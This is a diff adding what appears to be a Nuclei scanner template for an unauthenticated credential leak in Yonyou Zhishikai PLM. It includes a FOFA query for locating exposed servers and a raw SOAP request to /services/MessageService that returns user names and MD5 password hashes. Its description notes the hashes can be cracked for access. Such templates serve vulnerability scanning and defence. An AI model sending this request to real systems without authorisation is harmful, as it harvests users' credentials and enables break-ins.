@@ -1,0 +1,37 @@
+id: yonyou-zhishikai-plm-info-leak
+
+info:
+  name: "用友智石开PLM MessageService 接口敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="智石开PLM"
+      用友智石开PLM /services/MessageService 接口未正确实施访问控制，导致敏感用户凭证（包括密码的MD5哈希值）可通过未授权请求获取。攻击者可利用在线哈希破解服务还原明文密码，进而实现越权系统访问。
+  tags: 用友智石开PLM
+
+http:
+- raw:
+  - |
+    POST /services/MessageService HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Content-Type: text/xml;charset=UTF-8
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mes="MessageService">
+       <soapenv:Header/>
+       <soapenv:Body>
+          <mes:getWorkGroups/>
+       </soapenv:Body>
+    </soapenv:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'personName'
+  - type: word
+    part: body
+    words:
+    - 'personPwd'
